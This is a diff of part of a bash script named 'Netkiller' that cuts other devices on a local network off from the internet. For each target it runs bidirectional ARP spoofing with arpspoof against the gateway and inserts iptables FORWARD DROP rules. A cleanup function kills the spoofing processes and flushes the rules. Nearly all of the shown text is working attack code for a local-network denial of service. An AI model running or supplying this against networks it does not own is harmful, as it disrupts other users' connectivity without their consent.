@@ -182,35 +182,28 @@ for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller blocking the connection of $TARGET"
 
     # Bidirectional arp spoofing
-    arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-    PIDS+=($!)
-    arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
 
     # Set iptables rules to block/drop traffic
     iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-    iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
-    iptables -I FORWARD -s "$TARGET" -j DROP
-    iptables -I FORWARD -d "$TARGET" -j DROP
 done
 
 # Function to clean up
 cleanup() {
+    exec &>/dev/null
+    
     echo -e "\nCleaning up..."
     # Kill all arpspoof processes
     for pid in "${PIDS[@]}"; do
-        kill -9 "$pid" >/dev/null 2>&1
+        kill -9 "$pid" 2>/dev/null
     done
 
     # Flush iptables rules
     ip -s -s neigh flush all >/dev/null 2>&1
     iptables -P FORWARD ACCEPT
-    iptables -D FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP >/dev/null 2>&1
-    iptables -D FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP >/dev/null 2>&1
-    for TARGET in "${TARGETS[@]}"; do
-        iptables -D FORWARD -s "$TARGET" -j DROP >/dev/null 2>&1
-        iptables -D FORWARD -d "$TARGET" -j DROP >/dev/null 2>&1
-    done
+    iptables -F FORWARD
+
     echo ""
     echo "Restoring the connection..."
 }
